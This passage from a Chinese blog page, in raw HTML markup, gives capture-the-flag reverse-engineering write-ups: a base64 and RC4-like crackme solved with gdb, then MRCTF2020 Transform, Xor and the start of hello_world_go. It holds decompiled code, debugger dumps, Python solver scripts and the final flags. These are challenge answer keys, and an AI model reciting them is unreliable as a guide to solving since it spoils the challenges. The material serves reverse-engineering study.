map &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; str:
    base &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; map[ord(c) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;]
print (base)
&lt;span style=&#34;color:#75715e&#34;&gt;# base = &amp;#39;djX99X1H/pUTeiZZP/8xoYV8YwJuvZNqPk2N1ydzLV7MYvLf5dI&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 最后再补充一个 &amp;#39;=&amp;#39; 即可&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;破解完这个函数后再查看上两个函数&lt;/p&gt;
&lt;p&gt;根据调用判断第一个函数为第二个函数提供密钥，这个应该是固定结果，动态调试即可得到&lt;/p&gt;
&lt;p&gt;查看第二个函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; a3; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i ) {
    v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v9);
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v3);
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v9);
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v7) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v8) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a2) &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(&lt;span style=&#34;color:#ae81ff&#34;&gt;4LL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v4) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v9);
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这对输入的每一位做了个异或运算，异或的数字也是固定的，直接进行动态调试即可（根据经验猜测是RC4或者与其类似）&lt;/p&gt;
&lt;p&gt;根据base64的位数得知flag最多有39位&lt;/p&gt;
&lt;p&gt;进行动态调试&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gdb-peda$ start
gdb-peda$ c
Continuing.
please input your flag:flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;abcdefghijklmnopqrstuvwxyz0123456&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;----------------------------------registers-----------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
RAX: 0x27 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
RBX: 0x0
RCX: 0x0
RDX: 0x7ffffffed9c0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{abcdefghijklmnopqrstuvwxyz0123456}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
RSI: 0x7ffffffed9b0 --&amp;gt; 0x4010202030302010
RDI: 0x7ffffffed9e0 --&amp;gt; 0x7d363534333231 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123456}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
RBP: 0x7ffffffeded0 --&amp;gt; 0x400c80 --&amp;gt; 0x41ff894156415741
RSP: 0x7ffffffed590 --&amp;gt; 0x0
RIP: 0x400bbc --&amp;gt; 0xfffaf08d8d48c289
R8 : 0x0
R9 : 0x0
R10: 0x3
R11: 0x7fffff18ee90 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&amp;lt;__memset_avx2_unaligned_erms&amp;gt;:    vmovd  xmm0,esi&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
R12: 0x4005c0 --&amp;gt; 0x89485ed18949ed31
R13: 0x7ffffffedfb0 --&amp;gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;carry PARITY adjust zero sign trap INTERRUPT direction overflow&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-------------------------------------code-------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x400bad:    lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x510&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x400bb4:    mov    rdi,rax
   0x400bb7:    call   0x400550 &amp;lt;strlen@plt&amp;gt;
&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; 0x400bbc:    mov    edx,eax
   0x400bbe:    lea    rcx,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x510&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x400bc5:    lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x930&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x400bcc:    mov    rsi,rcx
   0x400bcf:    mov    rdi,rax
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;------------------------------------stack-------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
0000| 0x7ffffffed590 --&amp;gt; 0x0
0008| 0x7ffffffed598 --&amp;gt; 0x5f4f636d &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mcO_&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
0016| 0x7ffffffed5a0 --&amp;gt; 0x0
0024| 0x7ffffffed5a8 --&amp;gt; 0x31000000b0
0032| 0x7ffffffed5b0 --&amp;gt; 0x7000000075 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;u&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
0040| 0x7ffffffed5b8 --&amp;gt; 0xdf000000f8
0048| 0x7ffffffed5c0 --&amp;gt; 0x3c00000007
0056| 0x7ffffffed5c8 --&amp;gt; 0x7100000078 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;------------------------------------------------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
Legend: code, data, rodata, value

Breakpoint 2, 0x0000000000400bbc in ?? &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
gdb-peda$ x/10x $rdx
0x7ffffffed9c0: 0x6362617b67616c66      0x6b6a696867666564
0x7ffffffed9d0: 0x737271706f6e6d6c      0x307a797877767574
0x7ffffffed9e0: 0x007d363534333231      0x0000000000000000
0x7ffffffed9f0: 0x0000000000000000      0x0000000000000000
0x7ffffffeda00: 0x0000000000000000      0x0000000000000000
gdb-peda$ c
Continuing.
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;----------------------------------registers-----------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
RAX: 0x7ffffffed5a0 --&amp;gt; 0x1c00000027
RBX: 0x0
RCX: 0x138
RDX: 0x1c
RSI: 0x7d &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
RDI: 0x7ffffffed5a0 --&amp;gt; 0x1c00000027
RBP: 0x7ffffffeded0 --&amp;gt; 0x400c80 --&amp;gt; 0x41ff894156415741
RSP: 0x7ffffffed590 --&amp;gt; 0x0
RIP: 0x400bd7 --&amp;gt; 0x48fffffaf0858d48
R8 : 0x0
R9 : 0x0
R10: 0x3
R11: 0x7fffff18ee90 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&amp;lt;__memset_avx2_unaligned_erms&amp;gt;:    vmovd  xmm0,esi&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
R12: 0x4005c0 --&amp;gt; 0x89485ed18949ed31
R13: 0x7ffffffedfb0 --&amp;gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x246 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;carry PARITY adjust ZERO sign trap INTERRUPT direction overflow&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-------------------------------------code-------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x400bcc:    mov    rsi,rcx
   0x400bcf:    mov    rdi,rax
   0x400bd2:    call   0x4007db
&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; 0x400bd7:    lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x510&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x400bde:    mov    rdi,rax
   0x400be1:    call   0x400550 &amp;lt;strlen@plt&amp;gt;
   0x400be6:    mov    esi,eax
   0x400be8:    lea    rcx,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x93c&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;------------------------------------stack-------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
0000| 0x7ffffffed590 --&amp;gt; 0x0
0008| 0x7ffffffed598 --&amp;gt; 0x5f4f636d &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mcO_&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
0016| 0x7ffffffed5a0 --&amp;gt; 0x1c00000027
0024| 0x7ffffffed5a8 --&amp;gt; 0x67000000b0
0032| 0x7ffffffed5b0 --&amp;gt; 0x4b000000b8
0040| 0x7ffffffed5b8 --&amp;gt; 0xe000000069
0048| 0x7ffffffed5c0 --&amp;gt; 0x3f000000b9
0056| 0x7ffffffed5c8 --&amp;gt; 0xc5000000ec
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;------------------------------------------------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
Legend: code, data, rodata, value

Breakpoint 3, 0x0000000000400bd7 in ?? &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
gdb-peda$ x/10x 0x7ffffffed9c0
0x7ffffffed9c0: 0xc6ad437df5fd3576      0xa862a26e0d237b16
0x7ffffffed9d0: 0x2c84ae7c0c342488      0x5e656c6895cb5d7c
0x7ffffffed9e0: 0x00e699b5d8f9689b      0x0000000000000000
0x7ffffffed9f0: 0x0000000000000000      0x0000000000000000
0x7ffffffeda00: 0x0000000000000000      0x0000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将输入在函数执行前后两次的结果进行异或即可得到异或的数字，再与base64解码的结果进行异或即可，注意大小端问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; n2s, s2n

before &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7d363534333231307a797877767574737271706f6e6d6c6b6a6968676665646362617b67616c66&lt;/span&gt;
after &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe699b5d8f9689b5e656c6895cb5d7c2c84ae7c0c342488a862a26e0d237b16c6ad437df5fd3576&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;v5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfd\xf5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}G&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfe\x95\x13&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;z&amp;amp;Y?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa1\x85&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|c&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbd\x93&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;j&amp;gt;M&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\xd7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s-^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf2\xdf\xe5\xd2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

print (len(flag))

print (n2s(s2n(flag) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; before &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; after)[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;flag{e10adc3949ba59abbe56e057f20f883e}\x9b&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到flag&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{e10adc3949ba59abbe56e057f20f883e}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;mrctf2020transform&#34;&gt;[MRCTF2020]Transform&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;dword &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ]

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x62&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;]
print(len(dword), len(flag))

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(dword)):
    flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; dword[i]

code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;)]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(dword)):
    code[dword[i]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flag[i]
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(code)):
    print(chr(code[i]), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag: &lt;code&gt;MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;mrctf2020xor&#34;&gt;[MRCTF2020]Xor&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;MSAWB~FXZ:J:`tQJ&amp;#34;N@ bpdd}8g&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;):
    print(chr(ord(flag[i]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; i), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)

print()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag: &lt;code&gt;MRCTF{@_R3@1ly_E2_R3verse!}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;mrctf2020hello_world_go&#34;&gt;[MRCTF2020]hello_world_go&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;.rodata:00000000004D3C58 unk_4D3C58      db  66h ; f             ; DATA XREF: main_main:loc_49A40A↑o
.rodata:00000000004D3C58                                         ; main_main+25C↑o
.rodata:00000000004D3C59                 db  6Ch ; l
.rodata:00000000004D3C5A                 db  61h ; a
.rodata:00000000004D3C5B                 db  67h ; g
.rodata:00000000004D3C5C                 db  7Bh ; {
.rodata:00000000004D3C5D                 db  68h ; h
.rodata:00000000004D3C5E                 db  65h ; e
.rodata:00000000004D3C5F                 db  6Ch ; l
.rodata:00000000004D3C60                 db  6Ch ; l
.rodata:00000000004D3C61                 db  6Fh ; o
.rodata:00000000004D3C62                 db  5Fh ; _
.rodata:00000000004D3C63                 db  77h ; w
.rodata:00000000004D3C64                 db  6Fh ; o
.rodata:00000000004D3C65                 db  72h ; r
.rodata:00000000004D3C66                 db  6Ch ; l
.rodata:00000000004D3C67                 db  64h ; d
.rodata:00000000004D3C68                 db  5Fh ; _
.rodata:00000000004D3C69                 db  67h ; g
